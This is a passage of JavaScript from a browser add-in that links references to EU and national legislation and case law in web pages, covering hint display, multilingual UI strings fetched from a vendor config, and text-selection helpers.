        var euContextMenu = document.getElementById('eucasesTempContextMenu');
        var termContextMenu = document.getElementById('eucasesTempConceptContextMenu');

        var canShow = true;
        for (var i = 0; i < contextMenus.length; i++) {

            var contextMenu = contextMenus[i];
            canShow = canShow && contextMenu.style.display === 'none';
        }

        return canShow;
    }

    var attachLogoImage = function (hint) {
        var wrapperClass = hint.className;
        if (wrapperClass && wrapperClass != '') {

            var imageDiv = document.createElement('div');
            imageDiv.className = 'apis-hint-image-header';
            var image = document.createElement('img');
            image.onload = function (e) {
                htmlElementhelper.insertAfter(imageDiv, hint.firstChild);
            }
            imageDiv.appendChild(image);

            if (wrapperClass.indexOf('eurocases-hint-wrapper') >= 0) {

                if (images.getEurocasesLogo()) {
                    image.src = images.getEurocasesLogo();
                }
                else if (images.getEurocasesLogoBase64()) {
                    images.setBase64Src(image, images.getEurocasesLogoBase64());
                }
            }
            else if (wrapperClass.indexOf('apis-hint-wrapper') >= 0) {
                if (images.getApisLogo()) {
                    image.src = images.getApisLogo();
                }
                else if (images.getApisLogoBase64()) {
                    images.setBase64Src(image, images.getApisLogoBase64());
                }
            }
        }
    }

    return {
        position: position,
        autoCloseAfter: autoCloseAfter,
        removeAllHints: removeAllHints,
        canShow: canShowHint,
        attachLogoImage: attachLogoImage
    }

}());

var translations = (function () {

    var language = 'en';

    // used in absence of translation for the current langugae
    var defaultLanguage = 'en';

    // represents default (probably outdated resources, that can be used in absence of an internet connection)
    var _getDefaultTranslations = function () {

        var eng = {
            Language: "EN",
            Value: {
                cAll: "All",
                cCancel: "Cancel",
                cm_AllDocuments: "All documents",
                cm_Credentials: "Settings",
                cm_DocumentsIndexedWithThisTerm: "Documents indexed with this term:",
                cm_EuCL: "EU case law",
                cm_EuL: "EU legislation",
                cm_NaCL: "National case law",
                cm_NaL: "National legislation",
                cm_ShowToolTip: "Show tooltip",
                cOK: "OK",
                cPassword: "Password",
                cUserName: "User Name",
                cCheckFrLinks: "Check for links",
                cEULinksChecker: "Link Detector",
                cOperations: "Operations",
                cRemoveLinks: "Remove links",
                Save2Xml: "Save text to XML-file",
                cInsertLink: "Insert link",
                cRemoveLinksFromSelection: "Remove links from selection",
                cConfirmation: "Confirmation",
                cPlzConfirm: "Link Detector will check for existence of references to EU legislation and case law and will set links to the cited legal acts. This may take a while. Please, confirm!",
                cCannotAddLink: "Please, select text to insert a link.",
                cm_DocumentsReferringToThisAct: "Documents referring to this act / provision:",
                cm_RemoveLink: "Remove link",
                cm_InsertLink: "Insert link",
                cInformation: "Information",
                cSuccess: "Check completed.", // changed translations 
                cLinkTo: "Link to",
                cPlzEnterCompleteUrl: "Please enter the complete URL-address.",
                cLang: "Interface language:",
                cMsgChgLng: "You are about to change the user interface language.",
                cPlzConfirmRmLnk: "Please confirm the removal of links set by Link Detector.",
                cPlzConfirmRmLnkSel: "The links set by Link Detector will be removed. Please confirm!",
                cStAddNewLink: "Manual insertion of a link to external web resource",
                cStCredentials: "Settings",
                cStPutLinksAndTerms: "Recognition and highlighting of references to EU legislation and case law",
                cStRemove1: "Removing links to EU legislation and case law set by Link Detector from the selected text",
                cStRemoveLinksAndTerms: "The links to documents and EuroVoc terms set by Link Detector will be removed. Please confirm!",
                cStSave2Xml: "Save text to XML-file",
                cPlsSelLink: "Please select text with links set by Link Detector.",
                cMsgNoLinksSetByELCFound: "No links set by Link Detector have been found.",
                cErrorOccured: "Error occured.",
                cWorking: "Checking for links...",
                cm_LongCite: "Full citation",
                cm_ShortCite: "Short citation",
                cCaseLaw: "CaseLaw",
                cLegislation: "Legislation",
                cClose: "Close",
                cCopy: "Copy",
                cPressCtrlCopy: 'Press Ctrl-C to Copy.',
                CheckForTerms: "Check for EuroVoc terms",
                cConfirmLookForTerms: "Link Detector will check for existence of EuroVoc terms in the text of the document and will set links to documents indexed with these terms. This may take a while. Please, confirm!",
                cLookForTerms: "Checking for terms...",
                cInsLinkSucc: 'The setting of a link secceeded.', // new
                cLinksRemoved: 'The links have been removed.', // new
                cm_BGCL: "Bulgarian case law",
                cm_BGL: "Bulgarian legislation",
                cm_SubMenuLinks: "Links to the cited act/provision from",
                cm_SubMenuReferences: "Reference to the cited act",
                cm_SubMenuEdit: "Removal",
                cAboutVersion: "Version",
                cAboutCheckForUpdate: "Check for updates",
                cAboutRightReserved: "Apis Europe. All rights reserved.",
                cAboutLicense: "License agreement",
                cAboutAttribution: "Attribution:",
                cAboutAttributionText: "Icons Layout link, Fond add, Link delete, Cog and Information by Fatcow Web Hosting, published on IconArchive, are licensed under CC BY 4.0.",
                cAboutIcons: "Icons",
                cAboutAnd: "and",
                cAboutBy: "by",
                cAboutPublished: "published on",
                cAboutAreUnderLicense: "are licensed under",
                cUserGuide: "User guide",
                "cPlzConfirmCheckForRegisterInfo": "Link Detector will check for existence of names and/or identification numbers of persons and companies and will set links to the available information about them in Apis Web. Please, confirm!",
                "cLookForRegisterInfo": "Checking for persons and companies…",
                "cCheckForRegisterInfo": "Check for persons and companies",
                "cm_EIKActs": "Disclosed documents",
                "cm_EIKInsured": "Insured persons",
                "cm_EIKLinked": "Connected persons",
                "cm_EIKFins": "Financial indicators",
                "cm_EIKSources": "Information from other sources",
                "cm_EGNFirms": "Participation in companies",
                "cm_EGNLinked": "Connected persons",
                "cm_FirmSearch": "Search in Apis Web for information about the entity",
                "cm_PersonSearch": "Search in Apis Web for information about the person",
                "cm_EIKHeader": "Information in Apis Web about Company No",
                "cm_EGNHeader": "Information in Apis Web about Personal ID No",
                "cNoInfo": "No information"
            }
        }

        var bul = {
            Language: "BG",
            Value: {
                cAll: "Всички",
                cCancel: "Откажи",
                cm_AllDocuments: "Всички документи",
                cm_Credentials: "Настройки",
                cm_DocumentsIndexedWithThisTerm: "Документи, индексирани с този термин:",
                cm_EuCL: "Съдебна практика на ЕС",
                cm_EuL: "Законодателство на ЕС",
                cm_NaCL: "Национална съдебна практика",
                cm_NaL: "Национално законодателство",
                cm_ShowToolTip: "Покажи подсказка",
                cOK: "Потвърди",
                cPassword: "Парола",
                cUserName: "Потребителско име",
                cCheckFrLinks: "Провери за връзки",
                cEULinksChecker: "Link Detector",
                cOperations: "Операции",
                cRemoveLinks: "Премахни връзките",
                Save2Xml: "Запиши текста в XML-file",
                cInsertLink: "Постави препратка",
                cRemoveLinksFromSelection: "Премахни връзките от избраното",
                cConfirmation: "Потвърждение",
                cPlzConfirm: "Link Detector ще провери дали съществуват препратки към законодателството и съдебната практика на Европейския съюз и ще постави връзки към цитираните нормативни актове. Това може да отнеме известно време. Моля, потвърдете!",
                cCannotAddLink: "Моля, маркирайте текст, за да вмъкнете връзка.",
                cm_DocumentsReferringToThisAct: "Документи, препращащи към този акт / разпоредба:",
                cm_RemoveLink: "Изтрий препратка",
                cm_InsertLink: "Постави препратка",
                cInformation: "Информация",
                cSuccess: "Проверката за връзки приключи.",
                cLinkTo: "Свържи с",
                cPlzEnterCompleteUrl: "Моля, въведете пълния URL-адрес.",
                cLang: "Език на интерфейса:",
                cMsgChgLng: "С това действие ще промените езика на потребителския интерфейс.",
                cPlzConfirmRmLnk: "Моля, потвърдете изтриването на връзките, поставени от Link Detector.",
                cPlzConfirmRmLnkSel: "Връзките, поставени от Link Detector ще бъдат изтрити. Моля, потвърдете!",
                cStAddNewLink: "Ръчно поставяне на връзка към външен уеб ресурс",
                cInsLinkSucc: 'Поставянето на линк премина успешно.', // new
                cStCredentials: "Настройки",
                cStPutLinksAndTerms: "Разпознаване и маркиране на препратки към законодателството и съдебната практика на Европейския съюз",
                cStRemove1: "Премахване в маркирания текст на поставените от Link Detector термини към законодателството и съдебната практика на Европейския съюз",
                cStRemoveLinksAndTerms: "Връзките към документи и термини от EuroVoc, поставени от Link Detector ще бъдат заличени. Моля, потвърдете!",
                cStSave2Xml: "Запиши текста в XML-file",
                cPlsSelLink: "Моля, маркирайте текст с връзки, поставени от Link Detector.",
                cMsgNoLinksSetByELCFound: "Не са намерени връзки, поставени от Link Detector.",
                cErrorOccured: "Възникна грешка.",
                cWorking: "Проверяване за връзки...",
                cm_LongCite: "Пълен цитат",
                cm_ShortCite: "Кратък цитат",
                cCaseLaw: "Съдебна практика",
                cLegislation: "Законодателство",
                cClose: "Затвори",
                cCopy: "Копирай",
                CheckForTerms: "Провери за термини от EuroVoc",
                cConfirmLookForTerms: "Link Detector ще провери за наличието в текста на термини от речника EuroVoc и ще постави връзки към документи, индексирани с тези термини. Това може да отнеме известно време. Моля, потвърдете!",
                cLookForTerms: "Провеверява за термини...",
                cLinksRemoved: 'Премахването на връзките приключи', // нев
                cm_BGCL: "Българска съдебна практика",
                cm_BGL: "Българско законодателство",
                cm_SubMenuLinks: "Препратки към цитирания акт/разпоредба от",
                cm_SubMenuReferences: "Позоваване на цитирания акт",
                cm_SubMenuEdit: "Заличаване",
                "cAboutVersion": "Версия",
                "cAboutCheckForUpdate": "Проверка за по-нова версия",
                "cAboutRightReserved": "Апис Европа. Всички права запазени.",
                "cAboutLicense": "Лицензно споразумение",
                "cAboutAttribution": "Признание:",
                "cAboutAttributionText": "Иконите Layout link, Fond add, Link delete, Cog и Information от Fatcow Web Hosting, публикувани на IconArchive, са лицензирани съгласно CC BY 4.0.",
                "cAboutIcons": "Иконите",
                "cAboutAnd": "и",
                "cAboutBy": "от",
                "cAboutPublished": "публикувани на",
                "cAboutAreUnderLicense": "са лицензирани съгласно",
                "cUserGuide": "Упътване за употреба",
                "cPlzConfirmCheckForRegisterInfo": "Link Detector ще провери за наличието на имена и/или идентификационни номера на лица и фирми и ще постави връзки към съдържащата се в Апис Уеб информация за тях. Това може да отнеме известно време. Моля, потвърдете!",
                "cLookForRegisterInfo": "Проверка за лица и фирми....",
                "cCheckForRegisterInfo": "Провери за лица и фирми",
                "cm_EIKActs": "Обявени актове",
                "cm_EIKInsured": "Осигурени лица",
                "cm_EIKLinked": "Свързани лица",
                "cm_EIKFins": "Финансови показатели",
                "cm_EIKSources": "Информация от други източници",
                "cm_EGNFirms": "Участия във фирми",
                "cm_EGNLinked": "Свързани лица",
                "cm_FirmSearch": "Търсене в Апис Уеб на информация за субекта",
                "cm_PersonSearch": "Търсене в Апис Уеб на информация за лицето",
                "cm_EIKHeader": "Информация в Апис Уеб за ЕИК",
                "cm_EGNHeader": "Информация в Апис Уеб за ЕГН",
                "cNoInfo": "Няма информация"
            }
        }

        var deu = {
            Language: "DE",
            Value: {
                cAll: "Alles",
                cCancel: "Abbrechen",
                cm_AllDocuments: "Alle Dokumente",
                cm_Credentials: "Einstellungen",
                cm_DocumentsIndexedWithThisTerm: "Dokumente mit diesem Begriff indiziert:",
                cm_EuCL: "EU-Rechtsprechung",
                cm_EuL: "EU-Gesetzgebung",
                cm_NaCL: "Nationale Rechtsprechung",
                cm_NaL: "Nationale Gesetzgebung",
                cm_ShowToolTip: "Hinweis anzeigen",
                cOK: "Bestätigen",
                cPassword: "Kennwort",
                cUserName: "Benutzername",
                cCheckFrLinks: "Überprüfung für Links",
                cEULinksChecker: "Link Detector",
                cOperations: "Handhabungen",
                cRemoveLinks: "Links entfernen",
                Save2Xml: "Text in XML-Datei speichern",
                cInsertLink: "Link einfügen",
                cRemoveLinksFromSelection: "Links von Auswahl entfernen",
                cConfirmation: "Bestätigung",
                cPlzConfirm: "Link Detector wird überprüfen ob Verweise auf EU-Gesetzgebung oder Rechtsprechung  vorhanden sind und wird Links zu den zitierten Rechtsakten einfügen. Dies kann eine Weile dauern. Bitte, bestätigen!",
                cCannotAddLink: "Bitte, markieren Sie einen Text um einen Link einzufügen.",
                cm_DocumentsReferringToThisAct: "Dokumente, die auf diesen Akt / Vorschrift verweisen",
                cm_RemoveLink: "Link entfernen",
                cm_InsertLink: "Link einfügen",
                cInformation: "Information",
                cSuccess: "Überprüfung für Links abgeschlossen.",
                cLinkTo: "Link zu",
                cPlzEnterCompleteUrl: "Bitte geben Sie die vollständige URL.",
                cLang: "Sprache der Schnittstelle:",
                cMsgChgLng: "Sie sind dabei, die Sprache der Benutzeroberfläche zu ändern.",
                cPlzConfirmRmLnk: "Bitte bestätigen Sie die Entfernung von Links gesetzt von EULinksCheker.",
                cPlzConfirmRmLnkSel: "Die vom Link Detector gesetzten Links werden gelöscht. Bitte, bestätigen!",
                cStAddNewLink: "Manuelle Einfügung vom Link zur externen Web-Ressource",
                cStCredentials: "Einstellungen",
                cStPutLinksAndTerms: "Erkennung und Hervorhebung von Verweisen auf EU-Gesetzgebung und Rechtsprechung",
                cStRemove1: "Entfernung von den vom Link Detector gesetzten Links die auf EU-Gesetzgebung und Rechtsprechung verweisen",
                cStRemoveLinksAndTerms: "Entfernung der Links gesetzt von 'Überprüfen Sie für Links' Funktion des Link Detector",
                cStSave2Xml: "Speichern Sie den Text in XML-file",
                cPlsSelLink: "Bitte, wählen Sie einen Text mit Links gesetzt vom Link Detector.",
                cMsgNoLinksSetByELCFound: "Keine Links vom Link Detector gefunden.",
                cErrorOccured: "Fehler aufgetreten.",
                cWorking: "Überprüfen auf Links...",
                cm_LongCite: "Vollständiges Zitat",
                cm_ShortCite: "Kurzes Zitat",
                cCaseLaw: "CaseLaw",
                cLegislation: "Legislation",
                cClose: "Schließen",
                cCopy: "Kopieren",
                cLookForTerms: "Überprüfen Sie für Terms...",
                cConfirmLookForTerms: "Link Detector ще провери за наличието в текста на термини от речника EuroVoc и ще постави връзки към документи, индексирани с тези термини. Това може да отнеме известно време. Моля, потвърдете!",
                cInsLinkSucc: 'Linkssetzung erfolgreich abgelaufen.', // new
                cLinksRemoved: 'Links wurden entfernt.', // new
                cm_BGCL: "Bulgarische Rechtsprechung",
                cm_BGL: "Bulgarische Gesetzgebung",
                cm_SubMenuLinks: "Links zum zitierten Akt/Bestimmung",
                cm_SubMenuReferences: "Verweis auf den zitierten Akt",
                cm_SubMenuEdit: "Entfernung",
                "cAboutVersion": "Version",
                "cAboutCheckForUpdate": "Auf Updates prüfen",
                "cAboutRightReserved": "Apis Europe. Alle Rechte vorbehalten.",
                "cAboutLicense": "Lizenzvereinbarung",
                "cAboutAttribution": "Namensnennung:",
                "cAboutAttributionText": "Icons Layout link, Fond add, Link delete, Cog und Information von FatCow Web Hosting, veröffentlicht auf IconArchive, sind unter der Lizenz CC BY 4.0.",
                "cAboutIcons": "Icons",
                "cAboutAnd": "und",
                "cAboutBy": "von",
                "cAboutPublished": "veröffentlicht auf",
                "cAboutAreUnderLicense": "sind unter der Lizenz",
                "cUserGuide": "Benutzerhandbuch",
                "cPlzConfirmCheckForRegisterInfo": "Link-Detektor wird auf das Vorhandensein von Namen und/oder Identifikationsnummern von Privatpersonen und Unternehmen überprüfen und wird Links zu den entsprechenden Informationen in Apis Web setzen. Dies kann eine Weile dauern. Bitte, bestätigen!",
                "cLookForRegisterInfo": "Überprüfung für Personen und Unternehmen…",
                "cCheckForRegisterInfo": "Überprüfung für Personen und Unternehmen",
                "cm_EIKActs": "Veröffentlichte Dokumente",
                "cm_EIKInsured": "Versicherte Personen",
                "cm_EIKLinked": "Verbundene Personen",
                "cm_EIKFins": "Finanzkennzahlen",
                "cm_EIKSources": "Information aus sonstigen Quellen",
                "cm_EGNFirms": "Firmenbeteiligung",
                "cm_EGNLinked": "Verbundene Personen",
                "cm_FirmSearch": "Suche im Apis Web nach Information über die Rechtsperson",
                "cm_PersonSearch": "Suche im Apis Web nach Information über die Person",
                "cm_EIKHeader": "Information im Apis Web über Firmennummer",
                "cm_EGNHeader": "Information im Apis Web über persönliche Identifikationsnummer",
                "cNoInfo": "Keine Information"
            }
        }

        var fra = {
            Language: "FR",
            Value: {
                cAll: "Tous",
                cCancel: "Annuler",
                cm_AllDocuments: "Tous les documents",
                cm_Credentials: "Paramètres",
                cm_DocumentsIndexedWithThisTerm: "Documents indexés avec ce terme:",
                cm_EuCL: "Jurisprudence de l'UE",
                cm_EuL: "Législation de l'UE",
                cm_NaCL: "Jurisprudence nationale",
                cm_NaL: "Législation nationale",
                cm_ShowToolTip: "Afficher info-bulle",
                cOK: "OK",
                cPassword: "Mot de passe",
                cUserName: "Nom d'utilisateur",
                cCheckFrLinks: "Vérifier les liens",
                cEULinksChecker: "Link Detector",
                cOperations: "Opérations",
                cRemoveLinks: "Supprimer les liens",
                Save2Xml: "Enregistrer le texte au format XML",
                cInsertLink: "Insérer le lien",
                cRemoveLinksFromSelection: "Supprimer les liens de la sélection",
                cConfirmation: "Confirmation",
                cPlzConfirm: "Link Detector vérifiera s’il existe des références menant vers la législation et la jurisprudence de l'Union européenne et mettra des liens vers les dispositions cités. Cela peut prendre un certain temps. Veuillez confirmer!",
                cCannotAddLink: "Veuillez sélectionner le texte pour insérer un lien.",
                cm_DocumentsReferringToThisAct: "Documents faisant référence à cet acte / disposition:",
                cm_RemoveLink: "Supprimer le lien",
                cm_InsertLink: "Insérer un lien",
                cInformation: "Informations",
                cSuccess: "La vérification des liens est terminée.",
                cLinkTo: "Lien vers",
                cPlzEnterCompleteUrl: "Veuillez entrez l'URL complète",
                cLang: "Langue de l’interface:",
                cMsgChgLng: "Vous êtes sur le point de changer la langue de l'interface utilisateur.",
                cPlzConfirmRmLnk: "Veuillez confirmer la suppression des liens établis par Link Detector.",
                cPlzConfirmRmLnkSel: "Les liens établis par Link Detector seront supprimés. Veuillez confirmer!",
                cStAddNewLink: "Insérez manuellement un lien vers une ressource Web externe",
                cStCredentials: "Paramètres",
                cStPutLinksAndTerms: "Identification et le marquage des références vers la législation et la jurisprudence de l'Union européenne",
                cStRemove1: "Retrait de liens menant vers la législation et la jurisprudence de l'UE établis par Link Detector à partir du texte sélectionné",
                cStRemoveLinksAndTerms: "Retrait de liens menant vers la législation et la jurisprudence de l'UE établis par Link Detector avec la fonction  'Vérifier les liens'",
                cStSave2Xml: "Enregistrer le texte au format XML",
                cPlsSelLink: "Veuillez sélectionner le texte avec des liens établis par Link Detector.",
                cMsgNoLinksSetByELCFound: "Aucun lien établi par Link Detector.",
                cErrorOccured: "Еrreur est survenue.",
                cWorking: "Vérification des liens...",
                cm_LongCite: "Citation complète",
                cm_ShortCite: "Courte citation",
                cCaseLaw: "CaseLaw",
                cLegislation: "Legislation",
                cClose: "Fermer",
                cCopy: "Copier",
                cLookForTerms: "Vérifier les Terms...",
                cConfirmLookForTerms: "Link Detector ще провери за наличието в текста на термини от речника EuroVoc и ще постави връзки към документи, индексирани с тези термини. Това може да отнеме известно време. Моля, потвърдете!",
                cInsLinkSucc: 'L\'établissement du lien a reussi.', // new
                cLinksRemoved: 'Les liens sont supprimés.', // new
                cm_BGCL: "Jurisprudence bulgare",
                cm_BGL: "Législation bulgare",
                cm_SubMenuLinks: "Liens vers l'acte cité/ la disposition de",
                cm_SubMenuReferences: "Référence à l'acte cité",
                cm_SubMenuEdit: "Suppression",
                "cAboutVersion": "Version",
                "cAboutCheckForUpdate": "Vérifier les mises à jour",
                "cAboutRightReserved": "Apis Europe. Tous droits réservés.",
                "cAboutLicense": "Accord de licence",
                "cAboutAttribution": "Attribution:",
                "cAboutAttributionText": "Les icônes Layout link, Fond add, Link delete, Cog et Information de Fatcow Web Hosting, publiées dans IconArchive sont sous licence CC BY 4.0.",
                "cAboutIcons": "Icônes",
                "cAboutAnd": "et",
                "cAboutBy": "de",
                "cAboutPublished": "publiées dans",
                "cAboutAreUnderLicense": "publiées dans",
                "cUserGuide": "Mode d'emploi",
                "cPlzConfirmCheckForRegisterInfo": "Link Detector vérifiera l'existence des noms et / ou des numéros d'identification des personnes et des entreprises et établira des liens vers les informations disponibles à propos d'eux sur Apis Web.  Cela peut prendre un certain temps. Veuillez confirmer!",
                "cLookForRegisterInfo": "Vérification des données sur des personnes et entreprises…",
                "cCheckForRegisterInfo": "Vérifier les données sur des personnes et entreprises",
                "cm_EIKActs": "Documents divulgués",
                "cm_EIKInsured": "Personnes assurées",
                "cm_EIKLinked": "Personnes liées",
                "cm_EIKFins": "Indicateurs financiers",
                "cm_EIKSources": "Informations provenant d'autres sources",
                "cm_EGNFirms": "Participation dans les entreprises",
                "cm_EGNLinked": "Personnes liées",
                "cm_FirmSearch": "Recherche dans Apis Web pour des informations sur l'entité",
                "cm_PersonSearch": "Recherche dans Apis Web pour des informations sur la personne",
                "cm_EIKHeader": "Les informations dans Apis Web sur le numéro d'entreprise",
                "cm_EGNHeader": "Les informations dans Apis Web sur le numéro d'identification personnel",
                "cNoInfo": "Aucune information"
            }
        }

        var ita = {
            Language: "IT",
            Value: {
                cAll: "Tutto",
                cCancel: "Cancellare",
                cm_AllDocuments: "Tutti i documenti",
                cm_Credentials: "Impostazioni",
                cm_DocumentsIndexedWithThisTerm: "I documenti indicizzati con questo termine:",
                cm_EuCL: "Giurisprudenzadell'UE",
                cm_EuL: "Legislazione UE",
                cm_NaCL: "Giurisprudenza nazionale",
                cm_NaL: "Legislazione Nazionale",
                cm_ShowToolTip: "Mostra descrizione comandi",
                cOK: "OK",
                cPassword: "Password",
                cUserName: "Nome utente",
                cCheckFrLinks: "Verifica la presenza di collegamenti",
                cEULinksChecker: "Link Detector",
                cOperations: "Operazioni", // -r
                cRemoveLinks: "Rimuovere collegamenti",
                Save2Xml: "Salva il testo come file XML",
                cInsertLink: "Inserisci collegamento",
                cRemoveLinksFromSelection: "Rimuovere i collegamenti da selezione",
                cConfirmation: "Conferma",
                cPlzConfirm: "Link Detector verificherà la presenza di riferimenti alla legislazione e alla giurisprudenza dell'UE e metterà collegamenti ai testi normativi citati. Questo potrebbe richiedere del tempo. Si prega di confermare!",
                cCannotAddLink: "Si prega di selezionare testo per inserire un collegamento.",
                cm_DocumentsReferringToThisAct: "Documenti relativi a questo atto / disposizione:",
                cm_RemoveLink: "Rimuovi collegamento",
                cm_InsertLink: "Inserisci collegamento",
                cInformation: "Informazioni",
                cSuccess: "Verificazione dei collegamenti compiuta.",
                cLinkTo: "Collegamento a",
                cPlzEnterCompleteUrl: "Si prega di inserire l'URL completo",
                cLang: "Lingua interfaccia:",
                cMsgChgLng: "Questa azione modificherà la lingua dell' interfaccia utente.",
                cPlzConfirmRmLnk: "Si prega di confermare l'eliminazione dеi collegamenti messi dal Link Detector.",
                cPlzConfirmRmLnkSel: "I collegamenti messi dal Link Detector saranno rimossi. Si prega di confermare!",
                cStAddNewLink: "Inserire manualmente un collegamento ad una risorsa web esterna",
                cStCredentials: "Impostazioni",
                cStPutLinksAndTerms: "Identificazione e marcatura di riferimenti alla legislazione e alla giurisprudenza dell'Unione europea",
                cStRemove1: "Rimuovere i collegamenti alla legislazione e alla giurisprudenza dell'UE messi dal Link Detector dal testo selezionato",
                cStRemoveLinksAndTerms: "Rimuovere i collegamenti alla legislazione e alla giurisprudenza dell'UE messi dal Link Detector con la funzione “Verifica la presenza di collegamenti”.",
                cStSave2Xml: "Salva il testo come file XML",
                cPlsSelLink: "Si prega di selezionare testo con collegamenti messi dal Link Detector.",
                cMsgNoLinksSetByELCFound: "Nessun collegamento messo dal Link Detector e stato trovato.",
                cErrorOccured: "Errore.",
                cWorking: "Controllo per i collegamenti...",
                cm_LongCite: "Citazione completa",
                cm_ShortCite: "Citazione breve",
                cCaseLaw: "CaseLaw",
                cLegislation: "Legislation",
                cClose: "Ciudi",
                cCopy: "Copia",
                cLookForTerms: "Verificare la presenza di termini...",
                cConfirmLookForTerms: "Link Detector will check for existence of EuroVoc terms in the text of the document and will set links to documents indexed with these terms. This may take a while. Please, confirm!",
                cInsLinkSucc: 'Il link e messo successivamente.', // new
                cLinksRemoved: 'I collegamenti sono stati rimossi.', // new
                cm_BGCL: "Giurisprudenza bulgara",
                cm_BGL: "Legislazione bulgara",
                cm_SubMenuLinks: "Collegamenti all'atto citato/disposizione di",
                cm_SubMenuReferences: "Riferimento all'atto citato",
                cm_SubMenuEdit: "Rimozione",
                "cAboutVersion": "Versione",
                "cAboutCheckForUpdate": "Controlla disponibilità aggiornamenti",
                "cAboutRightReserved": "Apis Europe. Tutti i diritti riservati.",
                "cAboutLicense": "Contratto di licenza",
                "cAboutAttribution": "Attribuzione:",
                "cAboutAttributionText": "L'icone Layout link, Fond add, Link delete, Cog ed Information da Fatcow Web Hosting, pubblicate su IconArchive, sono disponibili sotto licenza CC BY 4.0.",
                "cAboutIcons": "L'icone",
                "cAboutAnd": "ed",
                "cAboutBy": "da",
                "cAboutPublished": "pubblicate su",
                "cAboutAreUnderLicense": "sono disponibili sotto licenza",
                "cUserGuide": "Guida utente",
                "cPlzConfirmCheckForRegisterInfo": "Link Detector verificherà l'esistenza di nomi e/o numeri di identificazione di persone e società e metterà collegamenti alle informazioni contenute in Apis Web su di loro. Questo potrebbe richiedere del tempo. Si prega di confermare!",
                "cLookForRegisterInfo": "Verificare la presenza di persone e società….",
                "cCheckForRegisterInfo": "Verifica la presenza di persone e società",
                "cm_EIKActs": "Documenti divulgati",
                "cm_EIKInsured": "Persone assicurate",
                "cm_EIKLinked": "Persone collegate",
                "cm_EIKFins": "Indicatori finanziari",
                "cm_EIKSources": "Informazioni da altre fonti",
                "cm_EGNFirms": "Partecipazione a società ",
                "cm_EGNLinked": "Persone collegate",
                "cm_FirmSearch": "Ricerca di informazioni sul soggetto in Apis Web",
                "cm_PersonSearch": "Ricerca di informazioni sulla persona in Apis Web",
                "cm_EIKHeader": "Informazioni sul numero di iscrizione della società in Apis Web",
                "cm_EGNHeader": "Informazioni sul numero di identificazione personale in Apis Web",
                "cNoInfo": "Nessuna informazione"
            }
        }

        var r = [eng, bul, deu, fra, ita];

        return r;
    };

    // represents array that contains all translations, requested from techno.eucases
    var _translations = _getDefaultTranslations();

    var _setTranslationsRequest = technoHttpRequester.getConfigJson(function (response) {
        if (response.readyState == 4 && response.status == 200) {

            try {
                var configJson = JSON.parse(response.responseText);

                _translations = configJson.Translations;

                if (htmlElementhelper.isObject(console))
                    console.log('fetched newer version of translations');
            }
            catch (exception) {
                console.log('failed to parse the translations');
                console.log(exception);

                throw exception;
            }
        }
    });

    var _getTranslation = function () {

        // this set is used because of trick for making visual studio intellisense working, TOOD: remove in production
        var __translation = _translations[0];

        var __getTranslationByLanguage = function (lang) {

            // this set is used because of trick for making visual studio intellisense working, TOOD: remove in production
            var result = __translation;
            for (var i = 0; i < _translations.length; i++) {

                var currTranslation = _translations[i];
                if (currTranslation.Language.toLowerCase() === lang.toLowerCase()) {
                    result = currTranslation;
                    break;
                }

                result = null;
            }

            return result;
        }

        __translation = __getTranslationByLanguage(language);
        if (!htmlElementhelper.isObject(__translation))
            __translation = __getTranslationByLanguage(defaultLanguage);

        return __translation;
    }

    if (document.documentMode && document.documentMode > '9') {
        _setTranslationsRequest.send();
    } else if (document.documentMode === undefined) {
        _setTranslationsRequest.send();
    }

    return {
        getLanguage: function () { return language; },
        setLanguage: function (lang) { language = lang; },
        current: function () { return _getTranslation().Value; },
    }

})();

var linkSelection = (function () {

    // this attributes ared as means of communication with the IE and Chrome browsers for notifing if there is selection or selection whith links
    document.onselectionchange = function (ev) {
        document.body.setAttribute('hasValidSelectionForInsert', hasSelection() && isSelectionInSameBlock());
        document.body.setAttribute('hasLinksInSelection', hasLinksInSelection());

        addinEventDispatcher.dispatchAddonSelectionChanged();
    }

    var target = '';

    var setTarget = function (targetValue) {
        target = targetValue;
    }

    var haveCommonParent = function (fNode, sNode) {
        return fNode.parentNode === sNode.parentNode;
    }

    var haveCommonBlockAncessor = function (fNode, sNode) {

        var getToFistBlock = function (node) {
            if (htmlElementhelper.isBlock(node)) {
                return node;
            } else {
                var ancessors = htmlElementhelper.getAncessors(node);
                for (var i = 0; i < ancessors.length; i++) {
                    if (htmlElementhelper.isBlock(ancessors[i])) {
                        return ancessors[i];
                    }
                }
            }
        }

        var fBlock = getToFistBlock(fNode);
        var sBlock = getToFistBlock(sNode);

        return fBlock === sBlock;

        return result;
    }

    var getFirstAncessorByPredicateBefourFirstBlock = function (node, predicate) {
        var ancessors = htmlElementhelper.getAncessors(node);

        var result = null;
        for (var i = 0; i < ancessors.length; i++) {
            if (htmlElementhelper.isBlock(ancessors[i])) {
                break;
            }

            if (predicate(ancessors[i]))
                result = ancessors[i];
        }

        return result;
    }

    var getFirstAncessorByPredicate = function (node, predicate) {
        var ancessors = htmlElementhelper.getAncessors(node);

        var result = null;
        for (var i = 0; i < ancessors.length; i++) {
            if (predicate(ancessors[i])) {
                result = ancessors[i];
                break;
            }
        }

        return result;
    }

    var areStartAndEndInSameContainer = function (range) {
        return range.startContainer === range.endContainer;
    }

    var getAncessorsOuterHTMLs = function (node) {
        var ancessors = htmlElementhelper.getAncessors(node);

        var result = [];

        for (var i = 0; i < ancessors.length; i++) {
            result.push(ancessors[i].outerHTML);
        }

        return result;
    }

    var resolveText = function (node) {
        if (node.outerHTML)
            return node.outerHTML;
        else if (node.textContent)
            return node.textContent;
        else
            return node.innerHTML;
    }

    var getElementAtCommonLevel = function (lead, relevant) {

        var nodeToUse = lead;

        var relevantAncessors = htmlElementhelper.getAncessors(relevant);

        // search for common level, level where both nodes belogs to same parent
        while (relevantAncessors.indexOf(nodeToUse.parentNode) < 0)
            nodeToUse = nodeToUse.parentNode;

        return nodeToUse;
    }

    var hasCapturedNodes = function (range) {
        // determs if there are any captured nodes in the range

        // if the range text is not equal to the endcontainer + startcontainer, there are nodes between them

        var selectionText = range.toString();

        var result = false;

        if (areStartAndEndInSameContainer(range)) {
            // when the start and end container are the same, this means that the selection is across single text node
            // in text nodes we can't have any other nodes, so we can accept that there are no captured nodes

            return false;

            //var textFromStartToEnd = range.startContainer.textContent.slice(range.startOffset, range.endOffset);

            //result = textFromStartToEnd !== selectionText;
        }
        else {

            // when the two containers not the same object, the start container should be from the offset to the end,
            //  and the end container should be from start to the offset

            var startContainerText = range.startContainer.textContent.substr(range.startOffset);
            var endContainerText = range.endContainer.textContent.substr(0, range.endOffset);

